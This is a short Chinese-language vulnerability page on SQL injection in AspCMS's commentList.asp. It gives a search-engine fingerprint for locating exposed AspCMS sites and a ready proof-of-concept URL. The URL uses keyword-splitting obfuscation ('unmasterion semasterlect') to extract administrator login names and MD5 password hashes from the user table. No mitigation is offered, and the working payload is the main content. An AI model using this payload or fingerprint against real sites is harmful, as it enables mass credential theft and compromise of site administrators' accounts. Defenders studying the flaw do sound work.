# AspCMS commentList.asp SQL注入漏洞

## 漏洞描述

AspCMS commentList.asp 存在SQL注入漏洞，攻击者通过漏洞可以获取管理员md5的密码

## 漏洞影响

<a-checkbox checked>AspCMS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="ASPCMS"</a-checkbox></br>

## 漏洞复现

通过网站源码响应判断CMS

![img](../../../.vuepress/public/img/1628478800340-8ab8b7c0-3f74-4294-bac5-4153b18ae8c9.png)

验证POC

```php
/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
```

![img](../../../.vuepress/public/img/1628478943060-7c05774b-519d-47cf-ad9a-05fb52f74253.png)

成功获取管理员账号以及密码的MD5